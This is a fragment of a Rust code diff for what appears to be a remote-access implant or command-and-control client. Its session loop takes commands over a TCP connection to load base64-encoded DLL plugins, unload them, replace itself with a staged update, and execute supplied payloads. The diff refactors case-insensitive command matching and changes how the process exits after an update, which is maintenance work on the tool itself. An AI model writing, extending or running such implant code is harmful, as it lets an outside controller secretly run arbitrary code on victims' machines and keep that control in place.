@@ -39,6 +39,16 @@ pub fn run(ip: &str, port: u16) {
     }
 }
 
+fn starts_with_ascii_ci(value: &str, prefix: &str) -> bool {
+    value.len() >= prefix.len()
+        && value
+            .as_bytes()
+            .iter()
+            .take(prefix.len())
+            .zip(prefix.as_bytes().iter())
+            .all(|(a, b)| a.to_ascii_uppercase() == b.to_ascii_uppercase())
+}
+
 fn session(stream: &mut TcpStream, ip: &str, fp: &str, host: &str, plugins: &mut Manager) -> bool {
     let Ok(clone) = stream.try_clone() else { return false; };
     let mut reader = BufReader::new(clone);
@@ -56,7 +66,7 @@ fn session(stream: &mut TcpStream, ip: &str, fp: &str, host: &str, plugins: &mut
                 let raw = value[text::CMD.len()..].trim();
 
                 // CMD:PLUGIN:<id>:<base64-dll-bytes>
-                if raw.to_ascii_uppercase().starts_with(text::PLUGIN) {
+                if starts_with_ascii_ci(raw, text::PLUGIN) {
                     let rest = raw[text::PLUGIN.len()..].trim();
                     // id is up to first ':'
                     let (id, b64) = match rest.split_once(':') {
@@ -86,14 +96,14 @@ fn session(stream: &mut TcpStream, ip: &str, fp: &str, host: &str, plugins: &mut
                     continue;
                 }
 
-                if raw.to_ascii_uppercase().starts_with("UNLOAD:") {
+                if starts_with_ascii_ci(raw, "UNLOAD:") {
                     let id = raw[7..].trim();
                     let ok = plugins.unload(id);
                     let _ = send(stream, &format!("{}{}{}", if ok { text::ACK } else { text::ERR }, text::PLUGOUT, id));
                     continue;
                 }
 
-                if raw.to_ascii_uppercase().starts_with(text::PEVENT) {
+                if starts_with_ascii_ci(raw, text::PEVENT) {
                     let event = raw[text::PEVENT.len()..].trim();
                     if event.is_empty() {
                         let _ = send(stream, &format!("{}{}", text::ERR, text::PEVENT));
@@ -104,7 +114,7 @@ fn session(stream: &mut TcpStream, ip: &str, fp: &str, host: &str, plugins: &mut
                     continue;
                 }
 
-                if raw.to_ascii_uppercase().starts_with(text::UPDATE) {
+                if starts_with_ascii_ci(raw, text::UPDATE) {
                     let rest = raw[text::UPDATE.len()..].trim();
                     let (expected_hash, b64) = match rest.split_once(':') {
                         Some((h, b)) => (h.trim(), b.trim()),
@@ -158,13 +168,14 @@ fn session(stream: &mut TcpStream, ip: &str, fp: &str, host: &str, plugins: &mut
                         continue;
                     }
 
-                    if send(stream, &format!("{}{}", text::ACK, text::UPDATE)).is_ok() {
-                        std::process::exit(0);
-                    }
+                    // The successor waits for this process to exit before promoting the
+                    // staged payload. Return normally so the socket/session state is
+                    // dropped and the process exits cleanly after the ACK is written.
+                    let _ = send(stream, &format!("{}{}", text::ACK, text::UPDATE));
                     return true;
                 }
 
-                if raw.to_ascii_uppercase().starts_with(text::EXECUTE) {
+                if starts_with_ascii_ci(raw, text::EXECUTE) {
                     let rest = raw[text::EXECUTE.len()..].trim();
                     let (ext, b64) = match rest.split_once(':') {
                         Some((e, b)) => (e.trim(), b.trim()),
